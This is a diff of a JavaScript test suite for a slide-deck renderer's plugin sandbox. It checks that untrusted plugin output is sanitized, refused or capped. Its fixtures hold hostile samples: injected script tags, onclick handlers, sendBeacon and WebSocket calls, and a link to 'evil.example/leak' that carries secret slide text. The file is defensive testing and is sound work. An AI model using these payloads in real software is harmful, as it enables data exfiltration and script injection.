@@ -46,7 +46,7 @@ function render(fence, kit) {
   try { new WebSocket("ws://127.0.0.1:${P}/websocket"); } catch (e) {}
   try { navigator.sendBeacon("${H}/beacon", fence.body); } catch (e) {}
   var rows = fence.body.trim().split("\\n").map(function (l) { return "<li>" + l.replace(/&/g, "&amp;").replace(/</g, "&lt;") + "</li>"; }).join("");
-  return '<ul class="gantt-plugin-rows foreign-class" id="' + fence.id + '" onclick="alert(1)">' + rows + '</ul>' +
+  return '<ul class="lp-gantt-plugin-rows foreign-class cell-stage" id="' + fence.id + '" onclick="alert(1)">' + rows + '</ul>' +
     '<img src="${H}/img" alt=""><script>alert(2)</script><a href="${H}/link">link</a>' +
     '<svg id="not-mine"><use href="#elsewhere"></use></svg>';
 }
@@ -118,7 +118,7 @@ describe('the fence door through the real sandbox', () => {
     assert.equal(r.refusal, undefined, JSON.stringify(r.refusal));
     const html = r.rendered.html;
     const root = /<div data-lattice-plugin="gantt-plugin">([\s\S]*?)<\/div>\s*<\/div>/.exec(html)?.[0] ?? '';
-    assert.match(root, /<ul class="gantt-plugin-rows" id="gantt-plugin-[0-9a-f]{8}-0">/, 'its own class and id stay, the foreign class goes');
+    assert.match(root, /<ul class="lp-gantt-plugin-rows" id="lp-gantt-plugin-[0-9a-f]{8}-0">/, 'its own class and id stay, a foreign class and an engine class (`cell-stage`) go');
     assert.match(root, /<li>Design 1 &lt; 2<\/li><li>Build 3<\/li>/, 'it was handed the fence’s text as written');
     assert.doesNotMatch(html, /foreign-class|onclick|alert\(|<script|127\.0\.0\.1|not-mine/i, 'a stranger’s class, handler, script, address and id are gone');
     assert.match(html, /language-js/, 'a fence of another language is still code');
@@ -220,7 +220,7 @@ describe('the fence door through the real sandbox', () => {
   });
 
   test('NESTED SECTION and EMPTY OUTPUT are refused, each with its own reason, and the block stays', { timeout: TIMEOUT }, () => {
-    const nested = plugin('function render(){return "<section class=\\"gantt-plugin\\"><h2>FORGED</h2></section>"}\nexport { render as default };');
+    const nested = plugin('function render(){return "<section class=\\"lp-gantt-plugin\\"><h2>FORGED</h2></section>"}\nexport { render as default };');
     approve(nested);
     let r = run(nested);
     assert.match(r.rendered.html, /did not draw this block: the renderer returned a &lt;section&gt;/);
@@ -231,13 +231,50 @@ describe('the fence door through the real sandbox', () => {
     assert.match(r.rendered.html, /did not draw this block: the renderer returned nothing the sanitizer kept/);
   });
 
-  test('A FENCE ON A SLIDE A LATER PASS REBUILDS: the plugin’s text never becomes an address', { timeout: TIMEOUT }, async () => {
+  test('A SLIDE A SHIPPED PASS REBUILDS FROM ITS TEXT: the fence stays code, nothing reads the plugin’s text as an address', { timeout: TIMEOUT }, async () => {
     hits = [];
     const md = '---\ntheme: indaco\n---\n\n<!-- _class: video -->\n\n## Clip\n\n- https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\n```gantt\nSECRET-Q3-NUMBERS\n```\n';
     const p = plugin(`function render(f){return "<ul><li>https://evil.example/leak?d="+encodeURIComponent(f.body)+" <code>poster</code></li></ul>"}\nexport { render as default };`);
     approve(p);
     const r = run(p, md);
-    assert.match(r.rendered.html, /data-lattice-plugin="gantt-plugin"/);
-    assert.doesNotMatch(r.rendered.html.replace(/<div data-lattice-plugin[\s\S]*?<\/div>/, ''), /evil\.example|SECRET-Q3/, 'the video pass did not read the plugin’s bullet');
+    assert.doesNotMatch(r.rendered.html, /data-lattice-plugin/, 'the plugin never drew there');
+    assert.match(r.rendered.html, /language-gantt/, 'the author’s block is still code');
+    assert.doesNotMatch(r.rendered.html, /evil\.example/, 'no pass could read the plugin’s text as an address, because it never ran');
+    assert.ok(r.lines.warn.some((l) => /slide 1 is rebuilt by the shipped `video` pass/.test(l)), r.lines.warn.join('\n'));
+    await settle();
+    assert.deepEqual(hits, []);
+  });
+
+  test('FENCE NAMES AND PLUGIN NAMES THE DOOR WILL NOT RUN, each with its reason', { timeout: TIMEOUT }, () => {
+    const code = 'function render(){return "<p>x</p>"}\nexport { render as default };';
+    const warnOf = (plugins) => {
+      const e = engine.createEngine();
+      const warn = [];
+      for (const p of plugins) approve(p);
+      const r = renderWithCodePackages((hook, more) => e.render(DECK, 'indaco', { codePackages: hook, ...more }), { packages: [], plugins, executablePath: process.env.CHROME_PATH || undefined, warn: (l) => warn.push(l), info: () => {} });
+      return { warn, html: r.rendered.html };
+    };
+    let r = warnOf([plugin(code, { name: 'mer-plugin', fence: 'mermaid' })]);
+    assert.ok(r.warn.some((l) => /plugin mer-plugin is not run: `mermaid` is a fence a shipped plugin owns/.test(l)), r.warn.join('\n'));
+    r = warnOf([plugin(code, { name: 'bad-plugin', fence: 'Gantt <b>' })]);
+    assert.ok(r.warn.some((l) => /plugin bad-plugin is not run: its fence name .* is not lower-case/.test(l)), r.warn.join('\n'));
+    r = warnOf([plugin(code, { name: 'ga' }), plugin(code, { name: 'ga-extra', fence: 'other' })]);
+    assert.ok(r.warn.some((l) => /plugin ga is not run: its name overlaps ga-extra/.test(l)) && r.warn.some((l) => /plugin ga-extra is not run: its name overlaps ga/.test(l)), r.warn.join('\n'));
+    assert.doesNotMatch(r.html, /data-lattice-plugin/);
+  });
+
+  test('THE OUTPUT CAP IS THE SAME ON EVERY PASS of a render: `--strip-notes` renders twice and must not draw different blocks', { timeout: TIMEOUT }, () => {
+    const big = plugin('function render(f){return "<p>" + "x".repeat(150000) + f.id + "</p>"}\nexport { render as default };');
+    approve(big);
+    const md = `---\ntheme: indaco\n---\n\n## Many\n\n${Array.from({ length: 80 }, (_, i) => `\`\`\`gantt\nrow ${i}\n\`\`\``).join('\n\n')}\n`;
+    const drawn = [];
+    for (let pass = 0; pass < 3; pass++) {
+      const r = run(big, md);
+      drawn.push([(r.rendered.html.match(/data-lattice-plugin/g) || []).length, (r.rendered.html.match(/data-package-error/g) || []).length]);
+    }
+    assert.deepEqual(drawn[1], drawn[0], `pass 2 drew ${drawn[1]} where pass 1 drew ${drawn[0]}`);
+    assert.deepEqual(drawn[2], drawn[0]);
+    assert.ok(drawn[0][1] > 0 && drawn[0][0] > 0, `some drawn and some over the cap: ${drawn[0]}`);
+    assert.ok(drawn[0][0] * 150000 <= 8_000_000 + 150000, `at most the 8,000,000-character cap was kept (${drawn[0][0]} blocks)`);
   });
 });
